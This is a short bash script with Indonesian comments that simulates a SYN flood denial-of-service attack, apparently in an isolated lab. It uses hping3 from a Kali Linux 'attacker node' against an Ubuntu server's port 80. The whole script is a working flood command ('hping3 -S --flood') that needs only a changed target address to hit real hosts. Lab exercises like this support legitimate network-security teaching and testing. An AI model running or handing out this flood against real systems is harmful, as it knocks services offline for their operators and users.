#!/bin/bash
# ========================================================
# Skrip Simulasi Serangan SYN Flood Menggunakan Hping3
# Attacker Node: Kali Linux (192.168.56.103)
# Target Node: Ubuntu Server (192.168.56.104)
# ========================================================

TARGET_IP="192.168.56.104"
TARGET_PORT=80

echo "[!] Meluncurkan serangan SYN Flood menuju $TARGET_IP:$TARGET_PORT..."
echo "[!] Tekan Ctrl+C untuk menghentikan simulasi."

sudo hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP
